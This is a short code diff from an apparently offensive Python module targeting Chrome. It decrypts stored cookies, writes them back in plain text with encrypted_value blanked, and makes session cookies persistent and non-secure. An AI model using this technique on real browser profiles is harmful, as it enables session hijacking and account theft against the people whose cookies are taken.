@@ -117,7 +117,7 @@ class Chrome(ModuleInfo):
 						# This also makes all session cookies persistent
 				
 						cursor.execute('\
-									   UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0\
+									   UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, encrypted_value = "", is_persistent = 1, is_secure = 0\
 									   WHERE host_key = ?\
 									   AND name = ?',
 						(decrypted_value, result[0], result[1]));
